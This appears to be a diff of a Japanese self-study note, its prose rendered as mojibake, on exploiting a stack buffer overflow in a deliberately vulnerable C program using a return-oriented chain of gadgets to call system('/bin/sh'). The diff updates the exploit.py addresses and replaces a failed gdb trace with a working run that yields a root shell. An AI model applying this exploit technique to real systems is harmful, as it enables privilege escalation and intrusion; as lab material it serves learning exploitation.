@@ -207,7 +207,7 @@ x86‚ÌLinuxƒ}ƒVƒ“‚ÅAƒXƒ^ƒbƒNƒoƒbƒtƒ@ƒI[ƒo[ƒtƒ[Æã«‚Ì‚ ‚éƒvƒƒOƒ‰ƒ€‚ğCŒ¾Œê‚
 ˆÈ‰ºA‰ñ“š
 --------------------------------------------------------------------------------------------------------------------
 2,3‚ÌŠÂ‹«‚Å‘±‚¯‚Ü‚·
-‚Ü‚¸Æã«‚Ì‚ ‚éƒvƒƒOƒ‰ƒ€‚ğ—pˆÓ‚µ‚Ü‚·B(¡‰ñROP‚ğg‚¤‚Ì‚Åƒ`[ƒg)
+‚Ü‚¸Æã«‚Ì‚ ‚éƒvƒƒOƒ‰ƒ€‚ğ—pˆÓ‚µ‚Ü‚·B(¡‰ñROP‚ğg‚¤‚Ì‚Åƒ`[ƒgƒKƒWƒFƒbƒg‚ğ—pˆÓ)
 ------------test2.c ---------------------------------
 #include <stdio.h>
 #include <string.h>
@@ -260,6 +260,8 @@ Dump of assembler code for function main:
    0x00000000004005bd <+55>:    leave
    0x00000000004005be <+56>:    ret
 End of assembler dump.
+
+
 
 #Ÿ‚Éputs‚Ìˆø”‚Ìƒ|ƒCƒ“ƒ^[‚ğæ“¾‚µ‚Ü‚·B
 (gdb) b *main+45
@@ -395,19 +397,19 @@ poprdi
 exit
 ----------------------------
 
-----------------exploit.py------------
-import sys
-import struct
-from subprocess import Popen
 
-buffer = 0x7fffffffe470
-retbuf = 0x7fffffffe498
+----------------exploit.py------------
+import struct
+
+buffer = 0x7fffffffdd40
+retbuf = 0x7fffffffddd8
 system = 0x7ffff7a533d0
 binsh  = 0x7ffff7b9b3dd
 exit   = 0x7ffff7a48d70
-poprdi = 0x400598
-poprax = 0x40059a
+poprdi = 0x4005a1
+poprax = 0x4005a3
 offset = retbuf - buffer
+
 buf = "A" * offset
 buf += struct.pack('<Q', poprdi)
 buf += struct.pack('<Q', binsh)
@@ -420,39 +422,12 @@ buf += struct.pack('<Q', exit)
 
 print buf
 --------------------------------------
-$ python exploit.py | ./a.out
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
-#!?!? wtf@‹N“®‚µ‚Ü‚¹‚ñ;;
-#ˆê‰ˆ—’Ç‚¢‚Ü‚µ‚½ˆÈ‰º
-$ python exploit.py > input
-$ gdb a.out
-(gdb) set step-mode on
-(gdb) b *main+56
-(gdb) r < input
-Starting program: /home/a/a.out < input
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
+$ (python exploit.py;cat) | ./a.out
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@
+whoami
+root
 
-Breakpoint 1, 0x00000000004005be in main ()
-(gdb) n
-0x0000000000400598 in main ()
-(gdb) x/5i 0x400598
-=> 0x400598 <main+18>:  pop    %rdi
-   0x400599 <main+19>:  retq
-   0x40059a <main+20>:  pop    %rax
-   0x40059b <main+21>:  retq
-   0x40059c <main+22>:  movb   $0x0,-0xc(%rbp)
-(gdb) n
-0x000000000040059a in main ()
-(gdb) n
-0x000000000040059b in main ()
-(gdb) n
-__libc_system (line=0x7ffff7b9b3dd "/bin/sh") at ../sysdeps/posix/system.c:179
-179     ../sysdeps/posix/system.c: ‚»‚Ì‚æ‚¤‚Èƒtƒ@ƒCƒ‹‚âƒfƒBƒŒƒNƒgƒŠ‚Í‚ ‚è‚Ü‚¹‚ñ.
-(gdb) c
-Continuing.
-[Inferior 1 (process 3466) exited normally]
-
-##‚æ‚­‚í‚©‚è‚Ü‚¹‚ñ
+#–³–ƒVƒFƒ‹‚ª‹N“®‚µ‚Ü‚µ‚½B
 
 --------------------------------------------------------------------------------------------------------------------
 ‚±‚±‚Ü‚Å
